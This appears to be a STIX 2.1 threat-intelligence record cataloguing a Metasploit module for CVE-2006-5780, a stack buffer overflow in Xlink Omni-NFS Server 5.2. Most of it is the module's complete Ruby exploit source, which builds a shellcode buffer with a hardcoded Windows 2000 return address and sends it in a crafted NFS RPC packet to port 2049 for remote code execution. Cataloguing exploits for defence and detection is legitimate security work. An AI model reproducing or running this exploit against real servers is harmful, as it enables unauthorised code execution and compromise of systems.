{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--92a9d9d5-58b8-4d89-b71e-7bf1d6a2f4bc",
    "created": "2024-08-14T16:50:24.3812Z",
    "modified": "2024-08-14T16:50:24.381204Z",
    "name": "Omni-NFS Server Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Xlink Omni-NFS Server 5.2 When sending a specially crafted nfs packet, an attacker may be able to execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/nfs/xlink_nfsd.rb",
            "external_id": "xlink_nfsd.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-5780"
        },
        {
            "source_name": "reference",
            "url": "http://www.securityfocus.com/data/vulnerabilities/exploits/omni-nfs-server-5.2-stackoverflow.pm"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Omni-NFS Server Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Xlink Omni-NFS Server 5.2\n        When sending a specially crafted nfs packet, an attacker may be able\n        to execute arbitrary code.\n      },\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2006-5780' ],\n          [ 'OSVDB', '30224'],\n          [ 'BID', '20941' ],\n          [ 'URL', 'http://www.securityfocus.com/data/vulnerabilities/exploits/omni-nfs-server-5.2-stackoverflow.pm' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 336,\n          'BadChars' => \"\\x00\",\n          'PrepenEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows 2000 SP4 English',     { 'Ret' => 0x0040bb2e } ],\n        ],\n      'Privileged'     => true,\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2006-11-06'))\n\n    register_options([Opt::RPORT(2049)])\n  end\n\n  def exploit\n    connect\n\n    buff =  payload.encoded\n    buff << Rex::Arch::X86.jmp_short(6) + rand_text_english(2)\n    buff << [target.ret].pack('V')\n    buff << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"call $-330\").encode_string\n    buff << rand_text_english(251)\n\n    pkt =  [1].pack('N')\n    pkt << [0].pack('N')\n    pkt << [2].pack('N')\n    pkt << [100005].pack('N')\n    pkt << [1].pack('N')\n    pkt << [1].pack('N')\n    pkt << [1].pack('N')\n    pkt << [400].pack('N')\n    pkt << buff[0,400]\n    pkt << [1].pack('N')\n    pkt << [400].pack('N')\n    pkt << buff[300,400]\n\n    sploit = [pkt.length | 0x80000000].pack('N') + pkt\n\n    print_status(\"Trying target #{target.name}...\")\n    sock.put(sploit)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-11-06",
    "x_mitre_platforms": [
        "win'"
    ]
}